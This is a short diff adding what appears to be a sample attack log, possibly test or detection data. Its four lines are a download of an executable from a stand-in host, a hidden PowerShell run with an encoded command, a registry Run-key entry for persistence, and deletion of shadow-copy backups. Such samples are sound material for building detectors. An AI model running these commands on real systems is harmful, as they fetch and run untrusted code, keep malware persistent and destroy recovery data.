@@ -1,0 +1,7 @@
+User downloaded file via: wget http://malicious-site.com/payload.exe
+
+Executing payload: powershell.exe -windowstyle hidden -enc d2hvYW1p
+
+Setting persistence: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware
+
+Cleaning up: vssadmin delete shadows
